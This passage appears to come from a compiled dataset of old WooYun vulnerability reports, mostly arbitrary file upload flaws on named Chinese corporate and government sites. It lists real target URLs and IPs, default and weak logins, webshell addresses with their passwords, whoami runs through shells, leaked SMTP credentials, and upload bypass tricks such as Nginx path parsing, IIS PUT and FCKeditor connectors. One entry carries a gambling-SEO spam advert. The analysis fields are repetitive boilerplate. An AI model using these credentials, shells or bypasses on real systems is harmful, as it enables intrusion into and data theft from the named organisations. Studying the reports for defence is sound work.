**绕过**: 直接利用

**修复**: 对上传文件进行type等验证。。建议对系统做一次全面检查 对所有页面进行权限验证 sql注射等也处理下
---

---
### [wooyun-2012-013660] oppo某分站任意上传
**厂商**: 广东欧珀移动通讯有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://test.myoppo.com/bluesword/blue_sword.php?t=t_upload&Action=PostMsg

**POC**: 成功取得网站权限

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071198] 全峰快递网络报销系统弱口令 上传
**厂商**: 全峰快递 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ac.qfkd.com.cn/431000 123456 随意的找了个 就进去了..饿的叽里咕噜的 哎`. 真蛋疼 怪他`...

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 凑合修补下吧..
---

---
### [wooyun-2014-056686] 优酷某分站服务器沦陷root权限
**厂商**: 优酷 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意间，跑到优酷站上，随便鸟了下，发现目录遍历，找到一处 可上传，拿下菜刀一挥，我草 这权限 吓尿了。http://minisite.youku.com/test/thumbhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 嗒嗒嗒 你懂得。
---

---
### [wooyun-2015-091075] CCF计算机职业资格认证系统存在低级上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.首先注册并登陆该系统（www.cspro.org）。然后进入“我的信息”——“考生个人信息”页面。(具体页面应该是：http://www.cspro.org/lead/leadbpm.do?__action=goto_iframe&path=CCF_KS_BMXX&djtype=TT)在考生简历部分有一个“上传附件”，点开，直接上传一个JSP马。2.之后点击保存。然后重新进入“考生个人信息”页面。点开刚才上传的JSP的链接。——竟然能访问！！！3.之前我做测试的时候，马是很稳定的，一直能访问到。后来可能有所察觉，大概是加了个扫描并删除JSP文件的机制。但是毕竟是传上去了，毕竟已经访问到了。之后，你有大概30秒的时间做你想做的工作。4.翻一翻网站的源文件，就能顺势拿下数据库。这个认证考试，考生是要交费的。虽然一大部分组团的考生有优惠（免费、100元/人），但是个人报名要多少钱呢？三百块！

**POC**: 没有下载其源代码。想想也知道根本没有对上传进行有效过滤，连基本的后缀名过滤也没有。

**绕过**: 直接利用

**修复**: 进行上传过滤。同时不要解析上传目录下的jsp文件。
---

---
### [wooyun-2015-0111033] 上海侨务某信息系统任意文件上传及文件遍历#2
**厂商**: 上海市人民政府侨务办公室 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海市人民政府侨务办公室电子政务信息系统url:https://admin.qwb.sh.gov.cn其ip为：211.152.36.84，与之前的不同，虽然都是fck问题问题原因fck编辑器不正确配置https://admin.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../以上，文件遍历

**POC**: 文件上传https://admin.qwb.sh.gov.cn//qwb_inter/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=https://admin.qwb.sh.gov.cn//qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector在该上传目录里是没有之前上传过的wooyun.jspx的，这点也可以证明是不同系统一句话地址：https://admin.qwb.sh.go

**绕过**: 直接利用

**修复**: 正确配置fck，上传点过滤
---

---
### [wooyun-2015-0122456] 多个税务系统app后台漏洞
**厂商**: 某税务系统 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主要涉及http://101.231.95.27:8091服务器通过扫描端口发现开放着多个端口，进入后发现分别是不同的税务的后台此处有上传，有设置地址，可以用来钓鱼，上传处有漏洞好多人家都用它的

**POC**: 前台通过傻瓜万能密码可进入，没尝试sql注入此处有上传没有敢深入，啥也没干就看了看，勿查水表

**绕过**: 直接利用

**修复**: 过滤注入，上传，都是最基本的，求个邀请码。。
---

---
### [wooyun-2013-033463] 某省教育某中心文件上传（致全省高中小学生学籍老师个人信息泄露）
**厂商**: 某省教育某中心 | **年份**: 2013 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江苏省教育管理信息中心菊花：gzgl.etec.edu.cn/uids/login!login.action求20rank！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0110409] 后盾php学生作品无数安全漏洞
**厂商**: hdphp.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前看简历的时候，发现后盾培训的一个学生简历中有项目地址，打开后http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php发现可以任意文件遍历，可以下载，然后可以通过下载的代码发现其它bug，比如可以上传任意文件，然后可以上传自己的代码

**POC**: http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./../../../../遍历文件http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./..//tieba发现一个up.php，下载发现无验证上传自己写个表单上传文件，成功，应该是传到了upload目录下，访问刚刚上传的文件http://c41_wangpan.houdunphp.com/houduan/tiebahttps://wooyun-img.oss-cn-beijing.al

**绕过**: 直接利用

**修复**: 你们是做培训，修复方案一定很多吧。如果只是直接下线这些学生的项目，就显不出你们的水平了
---

---
### [wooyun-2013-046390] xSite建站软件多个站点沦陷
**厂商**: 广州市天河区大观陈虎城计算机开发部 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://xiste.cn/ 演示站后台http://www.xsite.cn/demo/xsite.php用户名密码默认xSite xsite ，进入后台后，附近管理上传木马，木马文件名可修改成muma.php.txt,上传成功直接可以执行，可以上传任意文件，只要在文件扩展名加上.txt。然后发现根目录是phpcms v9，查看数据库连接字符串，用大马连接，在管理员表中添加phpcms v9 的默认管理员用户名和默认加密后的密码，可登录http://www.xsite.cn/admin.php ,并同时可登录http://www.php.net.cn/admin.php 和http://siteteam.cn/admin.php。

**POC**: http://www.xsite.cn/demo/attachments/xsite/test.php.txt 附件中上传的。

**绕过**: 直接利用

**修复**: 演示版的功能不能太过强大，另外上传漏洞需要过滤，站点权限隔离等。
---

---
### [wooyun-2014-083102] 站长之家某站被解析txt做博彩
**厂商**: 站长之家 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.chinaz.com/apple/add.txt

**POC**: 长期收博彩流量,百度新闻源,骗子勿扰！联系QQ:88060733团队本身就有专业的seo 和日站人员 你那点骗术别来浪费大家的时间！

**绕过**: 直接利用

**修复**: 检查根目录是否存在恶意文件。据说是绕过上传限制拿的
---

---
### [wooyun-2016-0190447] 中国南方航空公司某站存在任意文件上传漏洞（Windows技巧绕过限制）
**厂商**: 中国南方航空股份有限公司 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <form action="http://pss.csair.com/enableq/Android/FileUpload.php?optionID=1" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="button" id="button" value="submit" /></form>直接上传php不行。试了一下Test.php:a.jpg //重命名为jpgtest.php. //可以但是重命

**POC**: <form action="http://pss.csair.com/enableq/Android/FileUpload.php?optionID=1" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="

**绕过**: 直接利用

**修复**: 过滤上传后缀
---

---
### [wooyun-2013-036663] 敏感信息泄露系列#1 系统管理员运维不当导致唱吧3000万+用户信息告急
**厂商**: Changba-inc | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 信息泄露源由于唱吧主站服务器WEB服务端配置缺陷，以及开发人员代码上线安全意识不足，直接将版本控制软件SVN所残留的信息发布到了线上。WooYun: Changba-inc唱吧svn敏感信息泄露白帽子曾经报告过一个svn信息泄露威胁，但唱吧的修复方案只是简单的针对http://访问源进行了限制，而对https的配置并未生效，导致仍然存在缺陷。https://changba.com/.svn/entries#2 写个自动化工具扫描，并爬行泄露的源码svn_disclosure.py https://changba.com /******************************************* Fetching: https://changba.com* mkdir changba.com* http://www.kulv.com/repos/kulv/KTV/www*

**POC**: #5 任意文件上传漏洞利用#6 查看数据库配置信息<?php// =============================// ======  纵切专用库  ===========// =============================/*mysql client 写数据库地址*/$config['ZuitaoKtvServer_client']['servername'] = '192.168.*.***';$config['ZuitaoKtvServer_client']['port'] = 3306;$config['ZuitaoKtvServer_client']['user

**绕过**: 直接利用

**修复**: #1 漏洞修复方案修复完整#2 找专业安全人员代码审计#3 可以找乌云众测平台的白帽子们帮你们消灭掉存在的边界隐患
---

---
### [wooyun-2011-01344] 新浪分站上传
**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://games.sina.com.cn/upload.htm

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-062220] 150个企业站群网站存在任意上传漏洞
**厂商**: 企业站群 | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我粗略统计了一下，累死我了！www.dghyjz.comhongqingzhi.comjunxinsheng.comwww.hongqingzhi.comwww.shengxianmj.comwww.kebian.netwww.xinpeng168.comwww.dgxyyq.netwww.gddspjs.comdgjiyi.comfgchangfang.comdgdezhou.comdgsgjx.combaoguang168.comdgxlwl.comtianfeng666.comwww.0769xs.netwww.hsfzy.comwww.dgjianlifz.comdgxinxinjn.comwww.dgdezheng.comwww.juxingyp.comdgyhss88.comdgyinzi.comwww.15818366850.comdgrjzy.comwww.dgrjzy.c

**POC**: 这四个就是统计的站群其中之一！

**绕过**: 直接利用

**修复**: 过滤上传格式！
---

---
### [wooyun-2015-0124053] 政府安全之湖北省环境保护厅某服务弱口令导致上传
**厂商**: 湖北省环境保护厅 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:http://59.172.182.106:80/manager/htmluser:adminpass:admin

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0163072] PHPOA4.0任意文件上传(后台）
**厂商**: 桂林天生智创信息技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 去官网下一份源码配置试了下，看到网盘试了下上传文件好吧，直接能上传php...下载链接类似于http://xxx/downurl.phpurls=datauploadfile/1/1450631688.php&filename=hhh.php改成http://xxx/data/uploadfile/1/1450631688.php上传一句话简直轻松官网demo测试：http://demo.phpoa.cn/data/uploadfile/2/1450632097.php密码：config

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制上传文件格式
---

---
### [wooyun-2015-0109803] 鹿泉市某管理系统存在任意文件上传漏洞
**厂商**: 鹿泉市卫生局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：鹿泉市健康档案信息管理系统http://61.182.231.214:8080/AHIS/Login/上传页面地址：http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jsp

**POC**: 上传后抓包上传路径为：LOCALSOURCE/PhotoGraph/201504221125274.jpgPOC，通过修改fname=jsp，即可达到上传jsp的目的POST http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jsp?ImportUrl=true&fname=jsp&filename=null HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jspAccept-L

**绕过**: 直接利用

**修复**: 权限控制，上传点过滤
---

---
### [wooyun-2015-0161632] dzzoffice的一份渗透报告
**厂商**: dzzoffice | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 二级域名扫描可得到oa.dzzoffice.com 默认密码admin admin存在任意文件上传之后通过读取数据库配置得到一个密码:Leyun00018080端口存在wdcp admin Leyun0001dzzoffice.com的8181端口同样存在此问题可以通过创建用户来获取权限在两台服务器中可以翻出如下信息:{s:6:"server";s:18:"smtp.exmail.qq.com";s:4:"port";s:2:"25";s:4:"auth";s:1:"1";s:4:"from";s:10:"zyx@dzz.cc";s:13:"auth_username";s:10:"zyx@dzz.cc";s:13:"auth_password";s:10:"xingli0826";}}密码xingli0826通过对smtp服务器的查看可登陆邮箱⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄看到的时候小小

**POC**: 由上面的几个邮箱 并通过whois可知DNS在dnspod上so.使用57389a24ccc951c90b74024a32ac81af破解后的密文nabifhxs登陆至此 已经把管理员的菊花爆掉一半

**绕过**: 直接利用

**修复**: 提高安全意识 密码换强一些 仔细检查每个网站的缺陷
---

---
### [wooyun-2015-0123805] 中石油某分公司系统漏洞打包
**厂商**: 中国石油天然气集团公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国石油天然气股份有限公司广西石化分公司物资采购供应管理信息系统http://222.83.251.40/logonAction.do问题出在系统使用的编辑器fckeditorhttp://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../WEB-INF/

**POC**: 任意文件上传http://222.83.251.40/fckeditor/editor/filemanager/browser/default/browser.html?Connector=http://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector可以直接上传jsp文件一句话地址：http://222.83.251.40/fckeditorhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/test.jsp

**绕过**: 直接利用

**修复**: 正确配置fck
---

---
### [wooyun-2014-053786] 某政务服务中心系统通用任意文件上传
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.这套系统主要是用在政务服务中心、行政服务中心之类的，是一套JSP的CMS，并且百度谷歌等搜索引擎均可以用关键字搜索到存在该类系统的网站，全部都为政府级别的网站，该系统中的后台上传页面未经过任何权限验证，导致可以访问上传页面，并且可上传任意格式的文件。我们来谷歌一下关键字，你就会发现全是政务服务中心的标题：<img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201403/161256078a78013af2ab82a25c49f39d8d27a2ef.jpg"利用页面：admin/upload.jsp 主要是这个上传页面getFileList.action 管理文件页面admin/getFileList.action 管理文件页面mutual/getFileList.action 管理文件页面#2.以下是收集了

**POC**: #3.我们看看它的上传页面全部都是一样，可推断是同款系统。#4.以第一个作为例子来证明可任意上传文件，上传一个JSP大马，上传完毕后跳转到文件管理，复制下载地址，默认是在http://www.***.com/upimg/info/***.jsp 这里。上传文件并没有被改名，看了不少这样的政府网，估计都被入侵了不少~权限还蛮大~

**绕过**: 直接利用

**修复**: PS：测试的Shell已删除，求不跨省，求发证书，不过很多网站已经被其它黑客挂了不少Shell~求通报尽快修复该漏洞，对这些页面做权限认证！
---

---
### [wooyun-2013-043909] 3A网络所有VPS通杀漏洞
**厂商**: www.cnaaa.com | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本人小菜。。提交了一个提权教程。管理说那教程太小白了。。给自己的小经验风险给大家电。我也不知道这样分析对不对。反正就是给大家分享下。   今天的主角是3A网络，官方网站：www.cnaaa.com  我也是入侵了，其中一个小VPS发现的问题。发现了，3A网络给每台VPS都有有个3A网络建议书。我就下载下来。我的妈呀。吓死我了。。下面就给大家发出来吧。感谢您选购3A网络的VPS，请认真阅读以下说明！！！！！！！！---------------------------------------------------------会员中心您可以自行远程桌面连接管理！安全须知：服务器登陆后请立即将密码修改掉，或者更换默认的3389远程端口为8888。（修改为其他端口会连不上服务器，除非您自己会设置windows防火墙）服务器已开启windows防火墙并安装了防黑客软件。基本可以抵御90%黑客攻击。桌

**POC**: 所有的VPS均可植入木马等等.

**绕过**: 直接利用

**修复**: root mysql 密码修复,说明书上修改
---

---
### [wooyun-2014-053030] 光明网某分站Nginx Multi-FastCGI代码执行 漏洞
**厂商**: gmw.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg（如图）漏洞证明：http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg/1.php （如图）

**POC**: 直接上漏洞证明吧，这个漏洞没有什么好解释的。也就是我们常说的解析漏洞。http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg（如图）漏洞证明：http://exam.gmw.cn/xieliu/images/banner/Accountant/1.jpg/1.php （如图）

**绕过**: 直接利用

**修复**: 两种解决方案：一、修改php.ini文件，将cgi.fix_pathinfo的值设置为0；二、在Nginx配置文件中添加以下代码：if ( $fastcgi_script_name ~ \..*\/.*php ) {return 403;}这行代码的意思是当匹配到类似test.jpg/a.php的U
---

---
### [wooyun-2014-064037] phpdisk V7 （20140604） 绕过补丁继续上传任意文件。
**厂商**: phpdisk.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先说一下 官方的demo站竟然还没打补丁。我进去的时候已经看见里面有几个马儿了。。 打下补丁 清下马儿把。来看看0604出的补丁修改了哪里。在plugins/phpdisk_client/client_sub.phpswitch ($action){case 'upload_file'://write_file(PHPDISK_ROOT.'system/2.txt',var_export($_POST,true));//write_file(PHPDISK_ROOT.'system/3.txt',var_export($_FILES,true));$sign_md5 = md5($uid.$settings[encrypt_key]);if(!$sign and $sign_md5<>$sign){echo 'Sign Error!';exit;}在这里上传的时候验证了$sign_md5

**POC**: 首先注册一个号由于密码他这里没有md5。  所以自己把自己的密码进行md5一次后再放进去。然后得到加密字符串。MjdjNWpzd0lOYTFtQTd6R1l1alkxRlhlS2ZiYnc4azV1VFIyNHFXLzluZ1p1K2JFOVdqZlRTbVJXMXZLL0FYb21ScGlVMU5wcU1hSjZXOHYzZXk4MnpOWU1pdk1oV2Zzb0RTQk9tNHdCYWpjeHNUWG9sZUtMK0s5VzlrMUJhNzkrOXgrSVV2dTZrVitscURFZk16djJtM0lsWjV6OUZvSE9JU0lUZw==然后在client_sub.php中$u_

**绕过**: 直接利用

**修复**: 加强验证。
---

---
### [wooyun-2015-0117639] 几枚gov任意上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://hunangrain.gov.cn/shenpi/main/upload.jsphttp://hunangrain.gov.cn/shenpihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20150602_065848.jsp?pwd=023&i=whoamiwin-h0jnjdbpdt0\administratorn-h0jnjdbpdt0\administratorhttp://www.1890.gov.cn/upload.jsphttp://www.1890.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1433198443992@1433198443992.jsp?pwd=023&i=whoamint authority\system

**POC**: http://hunangrain.gov.cn/shenpi/main/upload.jsphttp://hunangrain.gov.cn/shenpihttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20150602_065848.jsp?pwd=023&i=whoamiwin-h0jnjdbpdt0\administratorn-h0jnjdbpdt0\administratorhttp://www.1890.gov.cn/upload.jsphttp://www.1890.gov.cnhttps://wooyun-img.os

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-018689] Rexsee安卓开源网站【上传漏洞+解析漏洞】
**厂商**: 北京睿思汇通移动科技有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: apk.rexsee.com首先在该网站注册一个账号然后随便生成一个apk点击项目中心，找到刚才的apk权限很大= =

**POC**: 权限可大了

**绕过**: 直接利用

**修复**: 过滤设置目录权限……
---

---
### [wooyun-2014-063728] 南郑县人民政府上传漏洞(已被黑产)
**厂商**: 南郑县人民政府 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.nanzheng.gov.cn/texteditor/include/upload.aspx这个就是漏洞文件了先是直接上传试了一下返回信息里可以明白一切了，另外这绝对是人为恶意添加的，默认不可能有这几个后缀。然后构造URL上传http://www.nanzheng.gov.cn/texteditor/include/upload.aspx?type=File证实FILE确实可以上传此类后缀，不过应该是某位黑产牛为了防止同行二次破坏，就给设置了写入权限。

**POC**: http://www.nanzheng.gov.cn/log.txt另外还把日志文件暴露了，里面可以看到各种后台路径已经网站存放路径。http://www.nanzheng.gov.cn/htdlmin/Login.aspx日志上写的是2012年的 如果真是那么久的 那么久删掉吧。

**绕过**: 直接利用

**修复**: 这几个后缀肯定是人为后加的，所以不排除还存在其它漏洞的可能，麻烦提交给他们核实下吧
---

---
### [wooyun-2015-0114092] 翼机通省平台存在任意文件上传漏洞
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 系统的全名我是从用户手册中发现的http://14.146.224.121/systemmgr/syshelp!loadHelpFile.jspx?filename=user_manual.rar系统首页显示的是“一卡通平台”系统地址：http://14.146.224.121/login.jspx我注册了一个帐号：很好的公司密码：很好的公司请原谅我用这么土的名字很好的公司/很好的公司,进行登录

**POC**: 在数据管理，用户信息管理界面，你得新建一个用户信息可以随便填，新建成功后，我们发现头像那块多出来一个上传照片的链接上传后抓包改文件名后缀，即可上传jsp一句话一句话地址：http://14.146.224.121/temp/916820.jsp密码：woo0yun

**绕过**: 直接利用

**修复**: 上传点过滤
---

---
### [wooyun-2013-043379] 东方文辉网站群内容管理系统FSMCMS任意文件上传漏洞
**厂商**: FSMCMS | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站群内容管理系统   inurl:adminindex.jsphttp://www.cre.cn/cms/site/cms_site_template_upload.jsphttp://www.cupl.edu.cn:81/cms/site/cms_site_template_upload.jsphttp://www.chinca.org/cms/cms/site/cms_site_template_upload.jsp……

**POC**: http://www.cre.cn/site_template/上传文件地址……http://www.chinca.org/cms/site_template/1.jsp……

**绕过**: 直接利用

**修复**: 多个单位不理，只能发乌云了。
---

---
### [wooyun-2013-042679] 海底捞某系统任意上传导致沦陷及大量门店数据泄露
**厂商**: haidilao.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站地址：http://124.127.49.68:83/total.asp一看就有想法了，于是：http://124.127.49.68:83/excel/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 上传过滤
---

---
### [wooyun-2015-089528] 高安市公共资源交易信息网沦陷（政府）
**厂商**: 高安市 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在fck漏洞http://gaztbw.gov.cn/fckeditor/editor/fckeditor.html直接上传asp木马

**POC**: http://gaztbw.gov.cn/project/image/File/xunyi/xy.asp密码xunyi

**绕过**: 直接利用

**修复**: 这个不多说了，都懂的
---

---
### [wooyun-2013-032273] 15个gov edu的IISPUT漏洞合集
**厂商**: gov edu | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: filetype:do百度和google 搜索到的相关网站，同时吧gov 和edu IIS server 可写的低级漏洞也整理了以下！

**POC**: http://www.news.muc.edu.cn	IIS Put File Allow http://www.news.muc.edu.cn/f2b3be.asp;.jpghttp://lib.gxqzu.edu.cn		IIS Put File Allow http://lib.gxqzu.edu.cn/7d686e.asp;.jpghttp://jgbz.shaoxing.gov.cn	IIS Put File Allow http://jgbz.shaoxing.gov.cn/5ef72e.asp;.jpghttp://ipe.gzu.edu.cn		IIS Put File All

**绕过**: 直接利用

**修复**: 你懂得。。
---

---
### [wooyun-2013-045492] 东大智能一处越权任意上传致服务器沦陷
